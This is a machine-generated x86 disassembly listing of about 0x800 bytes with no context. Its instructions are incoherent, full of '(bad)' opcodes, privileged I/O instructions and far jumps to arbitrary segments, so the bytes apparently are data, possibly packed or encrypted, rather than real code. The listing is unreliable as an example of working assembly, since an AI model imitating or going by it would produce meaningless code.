  412148:	test   DWORD PTR [eax+0x40],esp
  41214b:	ret    
  41214c:	jno    0x412190
  41214e:	xor    bl,al
  412150:	xchg   esp,eax
  412151:	aas    
  412152:	imul   ebx,DWORD PTR [ebx],0x37469027
  412158:	sub    bl,BYTE PTR ds:0xa795f4ab
  41215e:	inc    ebx
  41215f:	xchg   ebp,eax
  412160:	outs   dx,DWORD PTR ds:[esi]
  412161:	xchg   edx,eax
  412162:	and    dl,BYTE PTR [eax+0x6d]
  412165:	or     al,0xfd
  412167:	enter  0x4ff4,0xb6
  41216b:	add    BYTE PTR [edx-0x2ee8a3d7],bl
  412171:	or     DWORD PTR [ebx+0x4097943b],edx
  412177:	addr16 dec ecx
  412179:	sbb    eax,0xec7b37c0
  41217e:	lods   al,BYTE PTR ds:[esi]
  41217f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412181:	fadd   QWORD PTR [ebp+0x4c]
  412184:	cmc    
  412185:	shr    esi,0x63
  412188:	test   al,0xa
  41218a:	mov    bl,0x8b
  41218c:	jne    0x412196
  41218e:	fwait
  41218f:	or     al,0xd7
  412191:	and    DWORD PTR [esi-0x5bcd3920],ecx
  412197:	xlat   BYTE PTR ds:[ebx]
  412198:	pushf  
  412199:	rol    BYTE PTR [edi],0x49
  41219c:	or     eax,DWORD PTR [ebp+edx*8+0x2c]
  4121a0:	sub    DWORD PTR [edx+0x10],ecx
  4121a3:	push   edx
  4121a4:	push   0x4808b59
  4121a9:	jecxz  0x412147
  4121ab:	(bad)  
  4121ac:	mov    esp,0xa734491
  4121b1:	mov    ch,0x8
  4121b3:	mov    al,ds:0x84383885
  4121b8:	add    al,0xea
  4121ba:	popf   
  4121bb:	cdq    
  4121bc:	pop    esi
  4121bd:	cmp    dl,BYTE PTR [ebp-0x7e]
  4121c0:	or     eax,0x1f17f224
  4121c5:	push   ds
  4121c6:	adc    ah,BYTE PTR [edx+0x74]
  4121c9:	cmp    eax,0xf73ca3c7
  4121ce:	mov    edx,0xb762b336
  4121d3:	in     al,dx
  4121d4:	call   0x468b:0xf3fd7a76
  4121db:	adc    ebp,DWORD PTR [ebx]
  4121dd:	and    DWORD PTR [eax+0x2911ad98],esp
  4121e3:	fwait
  4121e4:	mov    bh,0x7a
  4121e6:	clc    
  4121e7:	leave  
  4121e8:	cmp    BYTE PTR [edi-0x44],al
  4121eb:	mov    eax,ds:0xa70ec447
  4121f0:	cs jb  0x41225c
  4121f3:	jge    0x41221a
  4121f5:	xchg   esp,eax
  4121f6:	pop    ss
  4121f7:	inc    eax
  4121f8:	out    0xf3,al
  4121fa:	inc    ebp
  4121fb:	jmp    0xf3889600
  412200:	sbb    bl,BYTE PTR [esi]
  412202:	sbb    bl,BYTE PTR [ebx+0xe4bb1e5]
  412208:	nop
  412209:	js     0x412274
  41220b:	fist   DWORD PTR [ecx+0x3a]
  41220e:	jnp    0x41220c
  412210:	sahf   
  412211:	in     al,dx
  412212:	popf   
  412213:	push   ecx
  412214:	xchg   bl,dh
  412216:	mov    ebp,0x3d38d5be
  41221b:	mov    ebx,0x63ec4181
  412220:	cli    
  412221:	dec    edi
  412222:	in     eax,dx
  412223:	mov    cl,dl
  412225:	mov    eax,esi
  412227:	call   0xf8a6:0x8e4c8451
  41222e:	es in  al,dx
  412230:	dec    esp
  412231:	jge    0x41228b
  412233:	push   ebx
  412234:	jge    0x412222
  412236:	pop    ss
  412237:	inc    esi
  412238:	shr    ch,1
  41223a:	dec    ecx
  41223b:	imul   esp,DWORD PTR ds:0x3bd72bcd,0x6a
  412242:	push   cs
  412243:	(bad)  
  412244:	mov    ch,0x45
  412246:	repz dec ebp
  412248:	xchg   ebp,eax
  412249:	out    dx,al
  41224a:	add    DWORD PTR [eax],ecx
  41224c:	(bad)  
  41224d:	fxch   st(5)
  41224f:	gs (bad) 
  412251:	shl    DWORD PTR [bx+di+0x2750],0x93
  412257:	pushf  
  412258:	call   0x1aa4:0x97103174
  41225f:	out    dx,al
  412260:	inc    esi
  412261:	fisub  DWORD PTR [edx-0x4ef36e5c]
  412267:	xor    edx,edx
  412269:	gs inc esi
  41226b:	test   al,0x70
  41226d:	sub    al,0x7c
  41226f:	(bad)  
  412270:	fld    st(5)
  412272:	loope  0x4122f1
  412274:	xchg   ebp,eax
  412275:	inc    edx
  412276:	xor    esi,ecx
  412278:	nop
  412279:	ja     0x4122ba
  41227b:	call   0x463e8ff6
  412280:	pop    ebx
  412281:	test   al,0x41
  412283:	cmp    al,0xc4
  412285:	push   ebp
  412286:	mov    ds:0x49b6e169,al
  41228b:	sbb    BYTE PTR [ebp-0x12],dh
  41228e:	cld    
  41228f:	xchg   BYTE PTR [esi+esi*1],al
  412292:	xor    DWORD PTR [ebp-0x1e],eax
  412295:	fs clc 
  412297:	add    al,0x46
  412299:	into   
  41229a:	xchg   edx,eax
  41229b:	pop    esi
  41229c:	sti    
  41229d:	mov    ch,0x6a
  41229f:	sbb    BYTE PTR [esi-0x61],bl
  4122a2:	aam    0x32
  4122a4:	xor    DWORD PTR [ecx],eax
  4122a6:	and    eax,0xee5410b9
  4122ab:	jo     0x4122d5
  4122ad:	fwait
  4122ae:	jmp    0x41228c
  4122b0:	jmp    FWORD PTR [edi+ecx*1]
  4122b3:	mov    ebp,0x6a86c47c
  4122b8:	xchg   ecx,eax
  4122b9:	icebp  
  4122ba:	sub    esp,DWORD PTR [ebp+edi*2+0x2449cd99]
  4122c1:	jg     0x412243
  4122c3:	mov    dl,0xc6
  4122c5:	bound  ebx,QWORD PTR [edi-0x466fe2d6]
  4122cb:	into   
  4122cc:	lahf   
  4122cd:	inc    eax
  4122ce:	mov    ah,0x22
  4122d0:	pusha  
  4122d1:	imul   eax,DWORD PTR [edx+eax*8],0x9a123d25
  4122d8:	jns    0x412269
  4122da:	inc    ebx
  4122db:	add    al,0xa
  4122dd:	sub    eax,0x22364ef
  4122e2:	std    
  4122e3:	sub    dh,dl
  4122e5:	(bad)  
  4122e7:	sbb    ch,BYTE PTR [edx]
  4122e9:	xor    BYTE PTR [edx+0x26],0x7c
  4122ed:	sar    DWORD PTR [ebx-0x63],1
  4122f0:	lahf   
  4122f1:	aaa    
  4122f2:	and    ebp,DWORD PTR [edi-0x68]
  4122f5:	js     0x412320
  4122f7:	jl     0x412334
  4122f9:	mov    ds:0xb8fb902,al
  4122fe:	and    DWORD PTR [edx+0x41fec21f],0x8d019bf8
  412308:	xchg   esp,eax
  412309:	hlt    
  41230a:	sbb    esi,0xffffff87
  41230d:	mov    eax,0x66d786a4
  412312:	fidivr WORD PTR [ebx-0x5e74c992]
  412318:	cmp    ecx,esp
  41231a:	call   0xff32:0x515d7499
  412321:	dec    edi
  412322:	fbstp  TBYTE PTR ds:0x1791e85c
  412328:	mov    al,0x10
  41232a:	push   ebp
  41232b:	push   esp
  41232c:	stos   BYTE PTR es:[edi],al
  41232d:	inc    ebp
  41232e:	sub    cl,dh
  412330:	frstor [edi-0x257ebfce]
  412336:	(bad)  
  412337:	xor    eax,ebp
  412339:	mov    ebx,DWORD PTR [ebx]
  41233b:	in     al,0x6b
  41233d:	sti    
  41233e:	mov    ebx,0xb16dd160
  412343:	mov    dh,0xd9
  412345:	in     al,0xea
  412347:	sub    DWORD PTR [esi+0x13813e9e],ecx
  41234d:	sub    DWORD PTR [ebp-0x2d],esp
  412350:	push   edi
  412351:	xchg   edx,eax
  412352:	cld    
  412353:	dec    edx
  412354:	xchg   ecx,eax
  412355:	sub    DWORD PTR [edi-0x17],edx
  412358:	fist   WORD PTR [eax-0x51]
  41235b:	mul    BYTE PTR [edi-0x72]
  41235e:	mov    WORD PTR [ebp+0x5f11389],es
  412364:	fucomi st,st(4)
  412366:	inc    ebp
  412367:	mov    edx,0xc7e4b465
  41236c:	and    eax,0x7646cfa4
  412371:	std    
  412372:	outs   dx,BYTE PTR ds:[esi]
  412373:	sar    cl,0x41
  412376:	mov    eax,0x884431b6
  41237b:	inc    ebx
  41237c:	cld    
  41237d:	jmp    0x7a6d:0x9b75a14f
  412384:	or     DWORD PTR [ebx],ebp
  412386:	xlat   BYTE PTR ds:[ebx]
  412387:	sub    BYTE PTR [ebx+0x6a],bh
  41238a:	jmp    0x412341
  41238c:	add    ch,BYTE PTR [esi-0x114503bf]
  412392:	cmp    BYTE PTR ds:0x99b896be,ch
  412398:	ins    BYTE PTR es:[edi],dx
  412399:	push   ebp
  41239a:	add    al,0xde
  41239c:	xor    al,0x96
  41239e:	out    dx,eax
  41239f:	dec    dh
  4123a1:	mov    dl,0x7
  4123a3:	(bad)  
  4123a4:	in     eax,dx
  4123a5:	sahf   
  4123a6:	lds    esp,FWORD PTR [eax+0x5f15eb3c]
  4123ac:	mov    edx,0x93a8baee
  4123b1:	pop    ecx
  4123b2:	pop    ebx
  4123b3:	inc    esi
  4123b4:	dec    eax
  4123b5:	or     eax,0x3f1ff90a
  4123ba:	int3   
  4123bb:	(bad)  
  4123bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123bd:	ss call 0x48dfa27c
  4123c3:	or     ebp,esi
  4123c5:	add    ecx,DWORD PTR [esi+0x66]
  4123c8:	aam    0x35
  4123ca:	inc    edx
  4123cb:	push   cs
  4123cc:	mov    cs,WORD PTR ds:0x18309a88
  4123d2:	into   
  4123d3:	cmc    
  4123d4:	dec    ebp
  4123d5:	push   ebx
  4123d6:	or     al,0xe9
  4123d8:	mov    ?,WORD PTR [eax+ecx*1+0x2ca28c1b]
  4123df:	icebp  
  4123e0:	jmp    0x412408
  4123e2:	sub    DWORD PTR [ecx-0x10],ebp
  4123e5:	lods   eax,DWORD PTR ds:[esi]
  4123e6:	inc    ecx
  4123e7:	pusha  
  4123e8:	cmp    ah,BYTE PTR [esi-0x2b]
  4123eb:	sub    bh,0xf8
  4123ee:	sbb    esp,ebx
  4123f0:	fist   WORD PTR [eax+0x8]
  4123f3:	dec    ebp
  4123f4:	sbb    eax,esp
  4123f6:	xor    eax,esi
  4123f8:	jne    0x4123e5
  4123fa:	push   esi
  4123fb:	pop    ebx
  4123fc:	jge    0x4123c8
  4123fe:	bound  ebx,QWORD PTR [edx]
  412400:	stc    
  412401:	(bad)  
  412402:	jnp    0x412443
  412404:	pusha  
  412405:	jb     0x412420
  412407:	ins    BYTE PTR es:[edi],dx
  412408:	xor    DWORD PTR [edi],edx
  41240a:	push   esi
  41240b:	sbb    DWORD PTR [edi+0x55],ebp
  41240e:	dec    edi
  41240f:	ja     0x4123d9
  412411:	std    
  412412:	test   eax,0x709697a
  412417:	pusha  
  412418:	fdivr  QWORD PTR [ebx]
  41241a:	fld    QWORD PTR [eax]
  41241c:	lock adc DWORD PTR [esp+eax*1],edi
  412420:	fist   DWORD PTR [ebx-0x44433c1d]
  412426:	sbb    dh,bl
  412428:	jecxz  0x41243a
  41242a:	ins    DWORD PTR es:[edi],dx
  41242b:	dec    edx
  41242c:	mov    ds:0x5615733c,eax
  412431:	int    0x87
  412433:	in     al,dx
  412434:	xor    BYTE PTR [esi-0x1c],bl
  412437:	(bad)  
  412438:	shl    BYTE PTR ds:0x5a24170e,cl
  41243e:	shl    DWORD PTR [eax-0x18707a8e],0xdc
  412445:	dec    edi
  412446:	ret    
  412447:	imul   edx,DWORD PTR [edx-0x13],0x45
  41244b:	fst    QWORD PTR [esi]
  41244d:	or     esi,esp
  41244f:	scas   al,BYTE PTR es:[edi]
  412450:	pop    es
  412451:	cmp    eax,0xf8557414
  412456:	sub    eax,0xfb487ce9
  41245b:	sahf   
  41245c:	into   
  41245d:	dec    edi
  41245e:	aad    0x98
  412460:	xor    al,0x74
  412462:	rcl    eax,1
  412464:	mov    ecx,0x43083600
  412469:	push   cs
  41246a:	arpl   WORD PTR [ebx-0x63],ax
  41246d:	sub    eax,0xce1a1709
  412472:	gs ds aad 0x78
  412476:	cmp    al,0xe2
  412478:	jmp    0xd745:0x67ecb25b
  41247f:	fwait
  412480:	adc    BYTE PTR [eax],0x3a
  412483:	add    al,BYTE PTR [edx+ecx*1+0x39]
  412487:	or     ah,BYTE PTR [ecx-0x53]
  41248a:	cmp    BYTE PTR [esi-0x452fc87f],0x47
  412491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412492:	sbb    eax,0x1d9e7172
  412497:	jmp    0x4124c8
  412499:	arpl   sp,bp
  41249b:	imul   ecx
  41249d:	out    0xde,eax
  41249f:	mov    edx,0x935d2d53
  4124a4:	adc    DWORD PTR [bx+si+0x150b],0xffffff9f
  4124aa:	xchg   esp,eax
  4124ab:	pop    edx
  4124ac:	lock inc esp
  4124ae:	das    
  4124af:	mov    dl,0x16
  4124b1:	js     0x412447
  4124b3:	aas    
  4124b4:	inc    ebp
  4124b5:	out    0xd,eax
  4124b7:	sub    DWORD PTR [edi+0x28],edx
  4124ba:	add    edx,DWORD PTR [edx+0x4e]
  4124bd:	mov    al,0xec
  4124bf:	add    eax,0xe6d3e6c1
  4124c4:	mov    ecx,DWORD PTR [edx]
  4124c6:	iret   
  4124c7:	rcr    DWORD PTR [ebx-0x1ad8ad30],cl
  4124cd:	xchg   DWORD PTR [ecx],esp
  4124cf:	mov    edx,0xe235b59c
  4124d4:	and    eax,0x7bbf07ea
  4124d9:	arpl   bp,ax
  4124db:	pop    ebp
  4124dc:	dec    esp
  4124dd:	dec    eax
  4124de:	pop    es
  4124df:	mov    DWORD PTR [ecx-0x68],ebp
  4124e2:	sbb    DWORD PTR [edx+eax*8-0x67],ebx
  4124e6:	inc    edi
  4124e7:	out    dx,al
  4124e8:	and    eax,0xe8335d52
  4124ed:	fstp   TBYTE PTR [ebx+eiz*8]
  4124f0:	push   DWORD PTR [ebp+0x70]
  4124f3:	push   esi
  4124f4:	push   0x4efd4634
  4124f9:	cs popa 
  4124fb:	pop    edx
  4124fc:	xor    dh,ch
  4124fe:	push   0x620ca0f2
  412503:	sbb    DWORD PTR [edx+esi*4+0x16],ecx
  412507:	sbb    al,0x82
  412509:	mov    ebp,0x690f2cc3
  41250e:	sbb    BYTE PTR [ecx+0x18],bh
  412511:	bound  edi,QWORD PTR [edx+0x6]
  412514:	push   eax
  412515:	jnp    0x4124b6
  412517:	icebp  
  412518:	dec    ebx
  412519:	pop    esi
  41251a:	pcmpeqb mm2,QWORD PTR [esi-0x615fe206]
  412521:	imul   eax,DWORD PTR [eax-0x1e],0xffffffb8
  412525:	pop    eax
  412526:	mov    esp,esp
  412528:	call   0xce61:0xadf1059c
  41252f:	mov    ss,WORD PTR [edi-0x15]
  412532:	ss cwde 
  412534:	add    BYTE PTR [edx],dl
  412536:	in     eax,dx
  412537:	call   0xa0e49ba3
  41253c:	sub    DWORD PTR [eax+0x5842e5e7],ebx
  412542:	push   ebx
  412543:	dec    esp
  412544:	(bad)  
  412545:	cmp    ah,dl
  412547:	jo     0x412576
  412549:	leave  
  41254a:	xor    al,0x2f
  41254c:	mov    ebp,0x1fc354ee
  412551:	das    
  412552:	retf   
  412553:	call   0xab22:0x5870953
  41255a:	and    al,0x9c
  41255c:	arpl   si,dx
  41255e:	xchg   ebp,eax
  41255f:	jg     0x412520
  412561:	jb     0x41250f
  412563:	loope  0x4125bd
  412565:	xor    eax,DWORD PTR [edx]
  412567:	rsm    
  412569:	sbb    ebp,eax
  41256b:	xor    DWORD PTR [edi],eax
  41256d:	cmp    dl,BYTE PTR [eax]
  41256f:	repz push 0xffffff87
  412572:	sub    BYTE PTR [ebx],0x73
  412575:	mov    edi,0xbef3de4b
  41257a:	ins    DWORD PTR es:[edi],dx
  41257b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41257c:	fdiv   DWORD PTR [ebx+0x14]
  41257f:	pop    ecx
  412580:	in     al,0xd8
  412582:	aas    
  412583:	aam    0x5
  412585:	das    
  412586:	ss push cs
  412588:	pop    ss
  412589:	ss cli 
  41258b:	pusha  
  41258c:	or     ebp,edx
  41258e:	test   BYTE PTR [ebp-0x9],cl
  412591:	add    DWORD PTR [ecx-0x4c],eax
  412594:	lods   al,BYTE PTR ds:[esi]
  412595:	dec    esi
  412596:	push   ss
  412597:	xor    esp,esi
  412599:	and    al,0x97
  41259b:	sub    al,cl
  41259d:	nop
  41259e:	lods   al,BYTE PTR ds:[esi]
  41259f:	mov    cl,0x83
  4125a1:	cmp    DWORD PTR ds:0x6b569fbb,edi
  4125a7:	pop    edx
  4125a8:	pop    edx
  4125a9:	(bad)  
  4125aa:	fidivr WORD PTR [eax+ecx*4]
  4125ad:	pop    edi
  4125ae:	add    eax,0x961495e1
  4125b3:	add    DWORD PTR [ecx],esi
  4125b5:	fcomp  DWORD PTR [ebp-0x45]
  4125b8:	dec    ebp
  4125ba:	nop
  4125bb:	inc    ecx
  4125bc:	or     edi,DWORD PTR [edx+0x1c]
  4125bf:	push   edx
  4125c0:	pop    ds
  4125c1:	retf   0x9330
  4125c4:	mov    eax,0x707505b9
  4125c9:	aaa    
  4125ca:	inc    edx
  4125cb:	cli    
  4125cc:	lea    edi,[ebp-0x6c13e685]
  4125d2:	adc    ebp,DWORD PTR [ecx]
  4125d4:	std    
  4125d5:	push   eax
  4125d6:	int    0xa8
  4125d8:	mov    cl,0x91
  4125da:	mov    edx,0x5f7b1cc
  4125df:	(bad)  
  4125e0:	icebp  
  4125e1:	push   esp
  4125e2:	mov    bl,0x57
  4125e4:	retf   0xfffb
  4125e7:	stos   DWORD PTR es:[edi],eax
  4125e8:	sar    ah,cl
  4125ea:	arpl   WORD PTR [ecx-0x6f],sp
  4125ed:	mov    al,ds:0x8926f471
  4125f2:	hlt    
  4125f3:	stos   DWORD PTR es:[edi],eax
  4125f4:	push   eax
  4125f5:	or     ebp,DWORD PTR [esi+0x54]
  4125f8:	dec    esi
  4125f9:	cs push ss
  4125fb:	sbb    esi,ebp
  4125fd:	out    0x9d,al
  4125ff:	adc    eax,0xa7dbd767
  412604:	adc    al,0x9e
  412606:	imul   edi,DWORD PTR [edx+0x6a],0x53
  41260a:	xchg   edx,eax
  41260b:	cmp    eax,0x73471575
  412610:	inc    ebx
  412611:	xchg   DWORD PTR ds:0xe9b8c1aa,edx
  412617:	ins    DWORD PTR es:[edi],dx
  412618:	rcl    ebp,1
  41261a:	fisubr DWORD PTR [esi]
  41261c:	add    al,BYTE PTR [edi]
  41261e:	cli    
  41261f:	imul   eax,edx,0x9631e50a
  412625:	xor    DWORD PTR [esi],ebx
  412627:	sbb    BYTE PTR [ecx],0xba
  41262a:	push   es
  41262b:	div    BYTE PTR [eax+edx*8+0xdcc4de6]
  412632:	inc    ebx
  412633:	xchg   BYTE PTR [edx+0x30ae9e32],dh
  412639:	in     al,0x12
  41263b:	push   cs
  41263c:	mov    ch,0xea
  41263e:	pop    edx
  41263f:	jp     0x4125db
  412641:	arpl   WORD PTR [ebx+0x21],dx
  412644:	mov    cl,0xb4
  412646:	pop    esp
  412647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412648:	scas   al,BYTE PTR es:[edi]
  412649:	jns    0x412602
  41264b:	dec    ecx
  41264c:	mov    esp,0xf1c2e77d
  412651:	mov    esi,0x3e80713a
  412656:	test   al,0xc0
  412658:	mov    esi,0xa4e59ecf
  41265d:	dec    ecx
  41265e:	fwait
  41265f:	loop   0x4126d7
  412661:	or     ah,BYTE PTR [esi+0x1aa292b0]
  412667:	jno    0x412651
  412669:	sbb    eax,0x92b1d468
  41266e:	adc    eax,0x44346864
  412673:	or     DWORD PTR [edx],0xffffffef
  412676:	add    ebp,DWORD PTR [ecx-0x51]
  412679:	cmp    cl,BYTE PTR [ebx]
  41267b:	xor    DWORD PTR [ebx-0xb257e87],edx
  412681:	aad    0x2
  412683:	mov    dh,0xc7
  412685:	popfw  
  412687:	add    esi,DWORD PTR [edi-0x306d9113]
  41268d:	(bad)  
  41268f:	push   ebx
  412690:	dec    ecx
  412691:	cld    
  412692:	fs mov ch,0xed
  412695:	outs   dx,BYTE PTR ds:[esi]
  412696:	add    ch,dl
  412698:	repz pop ds
  41269a:	bound  edx,QWORD PTR ds:0xaa36dd4b
  4126a0:	adc    ah,BYTE PTR [esi-0x63297c05]
  4126a6:	or     ah,BYTE PTR [esp+ebx*4]
  4126a9:	or     DWORD PTR [ecx+0x45],0xae68f4e2
  4126b0:	fistp  WORD PTR [ecx]
  4126b2:	sbb    esi,DWORD PTR [edi]
  4126b4:	pop    edi
  4126b5:	push   0xffffffcb
  4126b7:	add    BYTE PTR [edx+0x118a6ec9],cl
  4126bd:	int    0x76
  4126bf:	int3   
  4126c0:	mov    ebx,0xd984df33
  4126c5:	std    
  4126c6:	push   cs
  4126c7:	sbb    dl,BYTE PTR [ebx+0x11ea30ae]
  4126cd:	dec    edx
  4126ce:	pop    eax
  4126cf:	iret   
  4126d0:	sub    ch,al
  4126d2:	mov    dh,0x85
  4126d4:	arpl   sp,cx
  4126d6:	adc    esi,DWORD PTR [ebx]
  4126d8:	bswap  esp
  4126da:	fnstenv [esi]
  4126dc:	jle    0x4126c2
  4126de:	mov    ds:0x801786ee,al
  4126e3:	enter  0xd600,0xda
  4126e7:	or     BYTE PTR [ecx+0x1f544ad5],0x14
  4126ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126ef:	mov    ebp,0x23180500
  4126f4:	pusha  
  4126f5:	and    dh,cl
  4126f7:	mul    DWORD PTR [ebx+0x5ff54254]
  4126fd:	push   es
  4126fe:	(bad)  
  412700:	fwait
  412701:	jnp    0x412744
  412703:	xor    bl,cl
  412705:	adc    ah,al
  412707:	dec    esp
  412708:	in     al,dx
  412709:	(bad)  
  41270a:	or     eax,0xbd3f7cf6
  41270f:	push   cs
  412710:	rcr    DWORD PTR [ebx],1
  412712:	cs mov ecx,edx
  412715:	mov    esp,0xbb4729c3
  41271a:	mov    cl,0x29
  41271c:	jle    0x4126fd
  41271e:	dec    ecx
  41271f:	sub    DWORD PTR [esi+ebp*2-0x3d887d28],edx
  412726:	dec    esp
  412727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412728:	es adc eax,0xecba1bc3
  41272e:	xor    eax,0xe75110d0
  412733:	nop
  412734:	xchg   edi,eax
  412735:	mov    esp,DWORD PTR [edx+edi*8+0x36]
  412739:	jnp    0x4127a0
  41273b:	in     al,0x74
  41273d:	shl    BYTE PTR [edi+ebx*4+0x1a82c257],0xc2
  412745:	fild   DWORD PTR [eax]
  412747:	ret    
  412748:	sbb    BYTE PTR [ebp+esi*8+0x3e8b790a],dl
  41274f:	mov    edx,0xd6a73d3b
  412754:	jmp    0x232c51d3
  412759:	fcomp  QWORD PTR [edi+0x67]
  41275c:	jg     0x4126e4
  41275e:	or     al,0x2f
  412760:	ja     0x412728
  412762:	push   esp
  412763:	ins    DWORD PTR es:[edi],dx
  412764:	hlt    
  412765:	inc    edx
  412766:	popa   
  412767:	pop    edx
  412768:	xor    al,0x85
  41276a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41276b:	push   cs
  41276c:	cmp    DWORD PTR [edx+esi*8+0x14106ca7],0x4f
  412774:	sbb    bl,BYTE PTR ds:0x12c1d355
  41277a:	fist   DWORD PTR [edx+0x752d0596]
  412780:	loopne 0x4127cf
  412782:	stos   DWORD PTR es:[edi],eax
  412783:	push   es
  412784:	mov    cl,0x1b
  412786:	cmp    esi,DWORD PTR [edx+0x46b07074]
  41278c:	rcr    dl,0x1a
  41278f:	repnz dec bx
  412792:	push   esi
  412793:	mov    ebx,0x62eb976a
  412798:	sbb    al,0x97
  41279a:	cmp    al,0xbe
  41279c:	int3   
  41279d:	cmp    al,0xc7
  41279f:	call   0xf6ae:0xe1fa37cc
  4127a6:	fcmovnb st,st(3)
  4127a8:	fldenv [edx]
  4127aa:	fnstcw WORD PTR [edi]
  4127ac:	or     DWORD PTR [ebx-0x53],0x58
  4127b0:	pop    edx
  4127b1:	jmp    0x962d:0x4042275
  4127b8:	mov    dh,0x1b
  4127ba:	popa   
  4127bb:	jno    0x4127d8
  4127bd:	rol    DWORD PTR [ecx+0x64fcd235],0x92
  4127c4:	pinsrw mm6,WORD PTR [edi+0xafb4385],0x9d
  4127cc:	arpl   WORD PTR [esi-0x2f5c5c38],bp
  4127d2:	inc    ax
  4127d4:	and    al,0xbd
  4127d6:	pop    esi
  4127d7:	pop    ss
  4127d8:	in     eax,0x7
  4127da:	scas   al,BYTE PTR es:[edi]
  4127db:	mov    ah,0xc7
  4127dd:	jns    0x41277e
  4127df:	pop    ecx
  4127e0:	cs ins BYTE PTR es:[edi],dx
  4127e2:	pop    edx
  4127e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127e4:	cdq    
  4127e5:	ret    0x9e64
  4127e8:	inc    edi
  4127e9:	sbb    eax,0x58b0d46e
  4127ee:	pop    es
  4127ef:	pusha  
  4127f0:	mov    edi,0x34cddbdd
  4127f5:	mov    ecx,cs
  4127f7:	sti    
  4127f8:	shl    DWORD PTR [eax],cl
  4127fa:	mov    ds:0x7bb93905,eax
  4127ff:	mov    ds:0x4f56d5c9,eax
  412804:	mov    esp,0x3dff956f
  412809:	cmp    BYTE PTR ds:0x1d1327be,ah
  41280f:	xor    BYTE PTR [edx],dh
  412811:	pop    eax
  412812:	adc    DWORD PTR [ebp-0x4c62752c],eax
  412818:	mov    esp,0x570d5183
  41281d:	mov    ds:0x2d97670b,al
  412822:	ret    
  412823:	dec    esp
  412824:	enter  0x8352,0xba
  412828:	xor    ah,BYTE PTR [edx+0x13]
  41282b:	mov    ebx,0x2a0bb71
  412830:	aam    0xdd
  412832:	test   eax,0xe2078699
  412837:	aam    0x4c
  412839:	xor    DWORD PTR [eax-0x11],ebx
  41283c:	mov    esp,0x3c472bdb
  412841:	out    dx,eax
  412842:	shr    BYTE PTR [edi+0x48f5a670],cl
  412848:	fs push edx
  41284a:	fwait
  41284b:	test   al,0x9c
  41284d:	mov    BYTE PTR [edi],bl
  41284f:	xor    ebp,esp
  412851:	mov    eax,ds:0x78484409
  412856:	cmp    DWORD PTR [esi+0x1a],edi
  412859:	test   DWORD PTR [eax],ecx
  41285b:	cmp    BYTE PTR [ebx],dl
  41285d:	dec    ebx
  41285e:	ret    0xcbb7
  412861:	(bad)  
  412862:	fwait
  412863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412864:	jge    0x4128d5
  412866:	aaa    
  412867:	inc    ebp
  412868:	inc    ebp
  412869:	push   0x7d3a4561
  41286e:	cmc    
  41286f:	push   esp
  412870:	out    dx,al
  412871:	repz imul esi,esi,0x73
  412875:	adc    eax,DWORD PTR [ebx+edi*8+0x49]
  412879:	xchg   ebp,eax
  41287a:	and    bl,cl
  41287c:	shr    esp,1
  41287e:	in     eax,0xf0
  412880:	mov    dl,0x4
  412882:	(bad)
  412885:	jecxz  0x4128b0
  412887:	lds    edi,FWORD PTR [ebx-0x19]
  41288a:	mov    edx,0x26c99f51
  41288f:	mov    ah,BYTE PTR [eax+0x1446f113]
  412895:	cmp    bh,0x4
  412898:	sub    BYTE PTR [edx],dl
  41289a:	ja     0x4128da
  41289c:	lea    esi,[ebp-0x638a496f]
  4128a2:	mov    ds:0x352ad84b,eax
  4128a7:	out    dx,eax
  4128a8:	pop    edx
  4128a9:	adc    eax,0xe6ecf746
  4128ae:	aas    
  4128af:	repnz add BYTE PTR [ebx],0x84
  4128b3:	imul   eax,DWORD PTR [ebx],0xd
  4128b6:	adc    BYTE PTR [ebp-0x6a],bl
  4128b9:	ret    0x273b
  4128bc:	pop    eax
  4128bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128be:	stos   DWORD PTR es:[edi],eax
  4128bf:	int3   
  4128c0:	mov    edi,DWORD PTR [edx]
  4128c2:	xchg   al,ah
  4128c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c5:	jge    0x412849
  4128c7:	lea    ecx,[ebx+edi*2-0x73]
  4128cb:	push   ss
  4128cc:	sti    
  4128cd:	jle    0x412885
  4128cf:	cmp    cl,BYTE PTR [ecx+0x3bccb9e]
  4128d5:	int3   
  4128d6:	gs je  0x41288c
  4128d9:	adc    eax,0xf25e82a
  4128de:	mov    WORD PTR [ebp+0x58],fs
  4128e1:	cmp    DWORD PTR [esi+0x57],edi
  4128e4:	std    
  4128e5:	sbb    bh,bl
  4128e7:	add    DWORD PTR [esi+eiz*1-0x35dbb0ed],ebp
  4128ee:	push   cs
  4128ef:	xlat   BYTE PTR ds:[ebx]
  4128f0:	cmp    al,0xe4
  4128f2:	adc    BYTE PTR [ebx+0x2d],cl
  4128f5:	add    DWORD PTR [ebx-0x7e],esp
  4128f8:	jns    0x4128a1
  4128fa:	jge    0x41291b
  4128fc:	xor    BYTE PTR [ecx],0x69
  4128ff:	leave  
  412900:	xchg   DWORD PTR ds:0x9c90e343,edx
  412906:	pushf  
  412907:	or     eax,0xd0af4439
  41290c:	loopne 0x4128e0
  41290e:	add    DWORD PTR [edx+eax*1-0x37],eax
  412912:	repz adc ebx,DWORD PTR fs:[edx+ebx*2]
  412917:	jnp    0x41296b
  412919:	sub    BYTE PTR [edi+0x1229660],0x15
  412920:	aaa    
  412921:	cli    
  412922:	pushf  
  412923:	scas   eax,DWORD PTR es:[edi]
  412924:	add    al,0x89
  412926:	add    eax,DWORD PTR [esi]
  412928:	mov    ah,0xd2
  41292a:	push   0xfffffff2
  41292c:	jbe    0x412916
  41292e:	test   al,0x2a
  412930:	(bad)  
  412931:	lods   eax,DWORD PTR ds:[esi]
  412932:	add    DWORD PTR [esi-0x53],edx
  412935:	mov    esp,0x58a03662
  41293a:	es loope 0x412997
  41293d:	leave  
  41293e:	rol    dl,cl
  412940:	cld    
  412941:	mov    ds:0xc1f35231,al
